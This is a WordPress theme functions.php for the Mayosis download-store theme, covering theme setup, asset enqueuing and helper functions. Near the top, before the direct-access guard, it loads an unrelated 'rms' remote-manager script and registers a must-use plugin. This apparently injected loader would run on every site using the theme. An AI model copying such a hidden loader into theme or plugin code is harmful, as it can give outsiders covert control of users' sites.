<?php
/**
 * Mayosis functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package mayosis
 */
require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly.
}

if ( ! function_exists( 'mayosis_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function mayosis_setup() {
	    
	    // Set our theme version.
        define('GENERATE_VERSION', '2.8.1');
        
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on mayosis, use a find and replace
		 * to change 'mayosis' to the name of your theme in all the template files.
		 */
		load_theme_textdomain('mayosis', get_template_directory() . '/languages');

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
	    add_theme_support('post-thumbnails');
        add_image_size('mayosis-product-thumb-small', 170, 170, true);
        add_image_size('mayosis-product-grid-small', 150, 100, true);
        add_image_size('mayosis-product-wave-small', 90, 90, true);
        add_theme_support('custom-background');
        add_theme_support('custom-header');
        add_theme_support('automatic-feed-links');
        add_theme_support('title-tag');
        add_post_type_support('attachment:audio', 'thumbnail');
        add_post_type_support('attachment:video', 'thumbnail');
        add_filter('wpcf7_form_elements', 'do_shortcode');
        add_theme_support('title-tag');
        // Fixing the edd schema
        add_filter('edd_add_schema_microdata', '__return_false');
       

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
	    add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
        		register_nav_menus(array(
                'main-menu' => esc_html__('Main Menu', 'mayosis'),
                'top-menu' => esc_html__('Top Menu', 'mayosis'),
                'bottom-menu' => esc_html__('Bottom Menu', 'mayosis'),
                'mobile-menu' => esc_html__('Mobile Menu', 'mayosis'),
                'account-menu' => esc_html__('Account Menu', 'mayosis')
            ));
		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support('html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption'
        ));
       
        
         add_theme_support('post-formats', array(
            'aside',
            'image',
            'video',
            'gallery',
            'audio'
        ));
        add_post_type_support('download', 'post-formats');
      
		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );
		
#-----------------------------------------------------------------#
# Gutenberg
#-----------------------------------------------------------------#/
	    	// Theme supports wide images, galleries and videos.
		    add_theme_support( 'align-wide' );

        		// Make specific theme colors available in the editor.
            add_theme_support( 'editor-color-palette', array(
        	array(
        		'name'  => __( 'Light gray', 'mayosis' ),
        		'slug'  => 'light-gray',
        		'color'	=> '#f5f5f5',
        	),
        	array(
        		'name'  => __( 'Medium gray', 'mayosis' ),
        		'slug'  => 'medium-gray',
        		'color' => '#999',
        	),
        	array(
        		'name'  => __( 'Dark gray', 'mayosis' ),
        		'slug'  => 'dark-gray',
        		'color' => '#222a36',
               ),
        
               array(
        		'name'  => __( 'Purple', 'mayosis' ),
        		'slug'  => 'purple',
        		'color' => '#5a00f0',
               ),
        
                array(
        		'name'  => __( 'Dark Blue', 'mayosis' ),
        		'slug'  => 'dark-blue',
        		'color' => '#28375a',
               ),
        
                array(
        		'name'  => __( 'Red', 'mayosis' ),
        		'slug'  => 'red',
        		'color' => '#c44d58',
               ),
        
               array(
        		'name'  => __( 'Yellow', 'mayosis' ),
        		'slug'  => 'yellow',
        		'color' => '#ecca2e',
               ),
        
                array(
        		'name'  => __( 'Green', 'mayosis' ),
        		'slug'  => 'green',
        		'color' => '#64a500',
               ),
        
               array(
        		'name'  => __( 'White', 'mayosis' ),
        		'slug'  => 'white',
        		'color' => '#ffffff',
               ),
        ) );
        
        add_theme_support( 'editor-font-sizes', array(
            array(
                'name' => __( 'Small', 'mayosis' ),
                'size' => 14,
                'slug' => 'small'
            ),
            array(
                'name' => __( 'Normal', 'mayosis' ),
                'size' => 16,
                'slug' => 'normal'
            ),
            array(
                'name' => __( 'Large', 'mayosis' ),
                'size' => 26,
                'slug' => 'large'
            ),
            array(
                'name' => __( 'Huge', 'mayosis' ),
                'size' => 36,
                'slug' => 'huge'
            )
        ) );
        add_theme_support( 'wp-block-styles' );
        add_theme_support( 'editor-styles' );
        add_editor_style( 'style-editor.css' );
        add_theme_support( 'responsive-embeds' );

	}
endif;
add_action( 'after_setup_theme', 'mayosis_setup' );




function mayosis_preview_fix ($query) {
	if ( !is_page() ) {
		if( $query->is_main_query() && array_key_exists('preview_id', $_GET) ) {
			$post_types = array( 'download','post' );
				$query->set( 'post_type', $post_types );
		}
	}	
}
add_filter( 'pre_get_posts', 'mayosis_preview_fix' );

#-----------------------------------------------------------------#
# Include Mayosis Important Files
#-----------------------------------------------------------------#/
        
        require get_theme_file_path('admin/admin-init.php');
        require get_theme_file_path('admin/mayosis-admin-helper.php');
        require get_theme_file_path('library/widget.php');
        require get_theme_file_path('library/edd.php');
        require get_theme_file_path('library/breadcrumb.php');
        require get_theme_file_path('library/acf.php');
        require get_theme_file_path('library/acf_fallback.php');
        require get_theme_file_path('library/mayosis_comment.php');
        require get_theme_file_path('library/post_format.php');
        require get_theme_file_path('library/mayosis_navwalker.php');
        require get_theme_file_path('library/mayosis-accordion-navalker.php');
        require get_theme_file_path('library/mayosis_classes.php');
        if (class_exists('mayosis_core')){
        require get_theme_file_path('library/thumb-custom-size.php');
        require get_theme_file_path('library/mayosis_js.php');
        }

#-----------------------------------------------------------------#
# Enqueue Styles & scripts
#-----------------------------------------------------------------#/
    add_action('wp_enqueue_scripts', 'mayosis_scripts');
    function mayosis_scripts()
    {
    
    	// Theme stylesheet.
        wp_enqueue_style('mayosis-style', get_stylesheet_uri());
        wp_enqueue_style('mayosis-essential', get_template_directory_uri() . '/css/essential.css');
    	wp_enqueue_style( 'mayosis-plyr-style', get_template_directory_uri() . '/css/plyr.css' );
    	wp_enqueue_style( 'mayosis-main-style', get_template_directory_uri() . '/css/main.min.css' );
        wp_style_add_data( 'mayosis-main-style', 'rtl', 'replace' );
    
    	// Zero Icon.
        wp_enqueue_style('zeroicon-line', get_template_directory_uri() . '/css/zero-icon-line.css');
        
     $fontawesomeenabled = get_theme_mod( 'disable_font_awesome','hide');
     if ($fontawesomeenabled == 'show'){
    wp_enqueue_style('fontawesome', get_template_directory_uri() . '/css/all.min.css');
     }
    
       if (class_exists('WPBakeryShortCode')):
           	// Page Builder Font Icon.
        wp_enqueue_style('font-awesome');
       endif;
    
        wp_enqueue_script('bootstarp', get_template_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ) , '1.0', true);
        wp_enqueue_script('smoothscroll', get_template_directory_uri() . '/js/smoothscroll.min.js', array(), '1.1', true);
    
    	wp_enqueue_script( 'html5', get_theme_file_uri( '/js/html5.js' ), array(), '3.7.3' );
    	wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );
    
    	//Enqueue hoverIntent
    	wp_enqueue_script( 'hoverIntent' );
    	
       wp_enqueue_script('mayosis-yoututbe', get_template_directory_uri() . '/js/youtube.js', array(), '1.0', true);
    	// Theme Jquery.
        wp_enqueue_script('mayosis-theme', get_template_directory_uri() . '/js/theme.min.js', array('jquery'), '1.0', true);
        
        // Common Plugin Jquery.
        wp_enqueue_script('mayosis-common', get_template_directory_uri() . '/js/jquery.common.min.js', array(), '1.5.6', true);
    
         wp_enqueue_script('mayosis-smart-sticky', get_template_directory_uri() . '/js/sticky.js', array(), '1.0', true);
    
         wp_enqueue_script('mayosis-sticky-social', get_template_directory_uri() . '/js/sticky-sidebar-min.js', array(), '1.0', true);
    
         wp_enqueue_script('mayosis-fontsampler', get_template_directory_uri() . '/js/fontsampler.min.js', array('jquery'), '1.0', true);
         
    
        if (is_singular() && comments_open() && get_option('thread_comments')) {
            wp_enqueue_script('comment-reply');
        }
        
        wp_enqueue_script('mayosis-video-plyr', get_template_directory_uri() . '/js/plyr.min.js', array('jquery'), '1.1', true);
        
        
          $mayosis_player_type = get_theme_mod( 'product_wave_audio','hide');
          
          $mayosis_player_style = get_theme_mod( 'product_wave_style','standard');
          
          if ($mayosis_player_type == 'show'){
              if ( has_post_format( 'audio' ) && is_singular( 'download' )) {
            
            if ($mayosis_player_style=="fixed"){
            wp_enqueue_style('mayosis-awp_fixed_bar', get_template_directory_uri() . '/css/awp_fixed_bar.css');
            
            }else {
                
                wp_enqueue_style('mayosis-awp_standard_bar', get_template_directory_uri() . '/css/awp_standard_bar.css');
            }
                   
            wp_enqueue_style('mayosis-m-customscrollbar', get_template_directory_uri() . '/css/jquery.mCustomScrollbar.css');
        wp_enqueue_script('mayosis-audio-wave-surfer', get_template_directory_uri() . '/js/wavesurfer.min.js', array('jquery'), '3.3', false);
        
        wp_enqueue_script('mayosis-m-customscrollbar', get_template_directory_uri() . '/js/jquery.mCustomScrollbar.concat.min.js', array('jquery'), '1.0', false);
              
              
              wp_enqueue_script('mayosis-new-cb', get_template_directory_uri() . '/js/new_cb.js', array('jquery'), '1.0', false);
              
              wp_enqueue_script('mayosis-new-wave', get_template_directory_uri() . '/js/new.js', array('jquery'), '1.0', false);
              }
          }
    
       // Object parallax
            wp_enqueue_script('mayosis-parallax', get_template_directory_uri() . '/js/jquery.parallax-scroll.js', array('jquery'), '1.1', true);
          wp_enqueue_script('mayosis-object', get_template_directory_uri() . '/js/parallax.hover.js', array('jquery'), '1.5', true);
    
    
        wp_enqueue_script('mayosis-product-gallery', get_template_directory_uri() . '/js/gallery.main.js', array(), '0.9.4', true);
    
    
    
         /**
     * Enqueue jQuery Cookie
     */
    
    if (class_exists('Easy_Digital_Downloads') && function_exists('EDD_FES') && is_page(EDD_FES()->helper->get_option('fes-vendor-dashboard-page', false))) {
        if (isset($_GET['task']) && 'products' === $_GET['task']) {
            wp_enqueue_script('mayosis-cookie-js', get_template_directory_uri() . '/js/jquery.cookie.js', array('jquery'), '1.4.1', true);
        }
    }
    
    }

#-----------------------------------------------------------------#
# Register/Enqueue JS/CSS In Admin Panel
#-----------------------------------------------------------------#
    function mayosis_register_admin_styles()
    {
        wp_enqueue_style('mayosis-admin-css', get_template_directory_uri() . '/css/admin.css');
    
        wp_enqueue_script('mayosis-admin-js', get_template_directory_uri() . '/js/admin.js', array('jquery'), '0.9.4', true);
    
    }
    add_action('admin_enqueue_scripts', 'mayosis_register_admin_styles');
    // Menu Fallback
    function mayosis_default_menu()
    {
        get_template_part('includes/fallback-menu.php');
    }


#-----------------------------------------------------------------#
# Ajax URL
#-----------------------------------------------------------------#
    if( ! function_exists( 'mayosis_ajax' ) ){
      function mayosis_ajax() {
        ?>
        <script type="text/javascript">
          var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';
        </script>
        <?php
      }
    }
    add_action('wp_head','mayosis_ajax');
/*
 * Globals
 */
    function mayosis_global_var()
    {
        global $global_var;
        return $global_var;
    }
    $get_my_global_var = mayosis_global_var();
    echo esc_html($get_my_global_var['opt_name']);
    if (!isset($content_width)) {
        $content_width = 600;
    }


#-----------------------------------------------------------------#
# Dynamic css
#-----------------------------------------------------------------#/

    include_once('css/mayosis_custom_css_loader.php');

#-----------------------------------------------------------------#
# ACF Dependency
#-----------------------------------------------------------------#/
    function mayosis_disable_acf_on_frontend($plugins)
    {
        if (is_admin())
            return $plugins;
        foreach ($plugins as $i => $plugin)
            if ('advanced-custom-fields-pro/acf.php' == $plugin)
                unset($plugins[$i]);
        return $plugins;
    }
    add_filter('option_active_plugins', 'mayosis_disable_acf_on_frontend');

#-----------------------------------------------------------------#
# Editor stylesheet
#-----------------------------------------------------------------#/
    function mayosis_theme_add_editor_styles()
    {
        add_editor_style('custom-editor-style.css');
    }
    add_action('admin_init', 'mayosis_theme_add_editor_styles');

#-----------------------------------------------------------------#
# Comment on EDD Download
#-----------------------------------------------------------------#/
    function mayosis_edd_add_comments_support($supports)
    {
        $supports[] = 'comments';
        return $supports;
    }
    add_filter('edd_download_supports', 'mayosis_edd_add_comments_support');

#-----------------------------------------------------------------#
# Mayosis Paginantion
#-----------------------------------------------------------------#/
    if (!function_exists('mayosis_page_navs')): /**
     * Displays post pagination links
     *
     * @since mayosis 1.0
     */
        function mayosis_page_navs($query = false)
        {
            global $wp_query;
            if ($query) {
                $temp_query = $wp_query;
                $wp_query   = $query;
            }
            // Return early if there's only one page.
            if ($GLOBALS['wp_query']->max_num_pages < 2) {
                return;
            }
    ?>
    	<div class="common-paginav text-center">
    	<div class="pagination">
    		<?php
            $big = 999999999; // need an unlikely integer
            echo paginate_links(array(
                'base' => str_replace($big, '%#%', esc_url(get_pagenum_link($big))),
                'format' => '?paged=%#%',
                'current' => max(1, get_query_var('paged')),
                'total' => $wp_query->max_num_pages,
                'prev_text' => 'Previous',
                'next_text' => 'Next'
            ));
    ?>
    	</div>
    	</div>
    	<?php
            if (isset($temp_query)) {
                $wp_query = $temp_query;
            }
        }
    endif;

#-----------------------------------------------------------------#
# Download Dropdown Category
#-----------------------------------------------------------------#/
    function mayosis_get_terms_dropdown($taxonomies, $args)
    {
        $myterms = get_terms($taxonomies, $args);
        $output  = "<div class='download_cat_filter '><select name='download_cats'>";
        $output .= "<option value='all'>" . esc_html__("All", "mayosis") . "</option>";
        foreach ($myterms as $term) {
            $term_name = $term->name;
            $slug      = $term->slug;
            $output .= "<option value='" . $slug . "'>" . $term_name . "</option>";
        }
        $output .= "</select></div>";
        return $output;
    }
    
    
    function mayosis_vendor_cat_dropdown($taxonomies, $args)
    {
        $myterms = get_terms($taxonomies, $args);
        $output  = "<div class='mayosis_vendor_cat'><select name='download_cats'>";
        $output .= "<option value='all'>" . esc_html__("All", "mayosis") . "</option>";
        foreach ($myterms as $term) {
            $term_name = $term->name;
            $slug      = $term->slug;
            $output .= "<option value='" . $slug . "'>" . $term_name . "</option>";
        }
        $output .= "</select></div>";
        return $output;
    }
    
    
    
    add_filter('edd_has_variable_price', 'special_nav_class', 10, 2);
    function mayosis_excerpt($limit)
    {
        $excerpt = explode(' ', get_the_excerpt(), $limit);
        if (count($excerpt) >= $limit) {
            array_pop($excerpt);
            $excerpt = implode(" ", $excerpt) . '...';
        } else {
            $excerpt = implode(" ", $excerpt);
        }
        $excerpt = preg_replace('`[[^]]*]`', '', $excerpt);
        return $excerpt;
    }
    function mayosis_content($limit)
    {
        $content = explode(' ', get_the_content(), $limit);
        if (count($content) >= $limit) {
            array_pop($content);
            $content = implode(" ", $content) . '...';
        } else {
            $content = implode(" ", $content);
        }
        $content = preg_replace('/[.+]/', '', $content);
        $content = apply_filters('the_content', $content);
        $content = str_replace(']]>', ']]&gt;', $content);
        return $content;
    }
    function mayosis_description($limit)
    {
        $description = explode(' ', the_author_meta('description'), $limit);
        if (count($description) >= $limit) {
            array_pop($description);
            $description = implode(" ", $description) . '...';
        } else {
            $description = implode(" ", $description);
        }
        $description = preg_replace('`[[^]]*]`', '', $description);
        return $description;
    }
#-----------------------------------------------------------------#
# Title Clipping
#-----------------------------------------------------------------#/
    function mayosis_short_title($after = '', $length)
    {
        $mytitle = explode(' ', get_the_title(), $length);
        if (count($mytitle) >= $length) {
            array_pop($mytitle);
            $mytitle = implode(" ", $mytitle) . $after;
        } else {
            $mytitle = implode(" ", $mytitle);
        }
        return $mytitle;
    }



#-----------------------------------------------------------------#
# HEX to RGB Converter
#-----------------------------------------------------------------#/

    function mayosis_hexto_rgb($color, $opacity = false) {
    
    $default = 'rgb(0,0,0)';
    
    //Return default if no color provided
    if(empty($color))
    return $default;
    
    //Sanitize $color if "#" is provided
    if ($color[0] == '#' ) {
    $color = substr( $color, 1 );
    }
    
    //Check if color has 6 or 3 characters and get values
    if (strlen($color) == 6) {
    $hex = array( $color[0] . $color[1], $color[2] . $color[3], $color[4] . $color[5] );
    } elseif ( strlen( $color ) == 3 ) {
    $hex = array( $color[0] . $color[0], $color[1] . $color[1], $color[2] . $color[2] );
    } else {
    return $default;
    }
    
    $rgb =  array_map('hexdec', $hex);
    
    //Check if opacity is set(rgba or rgb)
    if($opacity){
    if(abs($opacity) > 1)
    $opacity = 1.0;
    $output = 'rgba('.implode(",",$rgb).','.$opacity.')';
    } else {
    $output = 'rgb('.implode(",",$rgb).')';
    }
    
    //Return rgb(a) color string
    return $output;
    }


#-----------------------------------------------------------------#
# Add Logout Button after account menu
#-----------------------------------------------------------------#/

    add_filter( 'wp_nav_menu_items', 'mayosis_account_logout', 10, 2 );
    function mayosis_account_logout( $items, $args ) {
        if (is_user_logged_in() && $args->theme_location == 'account-menu') {
            $items .= '<li class="menu-item"><a href="'. wp_logout_url(home_url('/')) .'">'.__( 'Log Out', 'mayosis').'</a></li>';
        }
    
        return $items;
    }





